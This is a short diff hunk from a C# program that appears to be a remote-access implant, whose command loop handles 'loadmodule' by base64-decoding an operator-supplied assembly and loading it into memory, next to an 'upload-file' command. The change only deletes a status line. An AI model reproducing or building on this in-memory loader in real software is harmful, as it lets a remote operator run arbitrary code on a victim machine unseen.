@@ -388,7 +388,6 @@ public class Program
 						{
 							var module = Regex.Replace(cmd, "loadmodule", "", RegexOptions.IgnoreCase);
 							var assembly = System.Reflection.Assembly.Load(System.Convert.FromBase64String(module));
-							output.AppendLine("Module loaded sucessfully");
 						}
 						else if (cmd.ToLower().StartsWith("upload-file"))
 						{
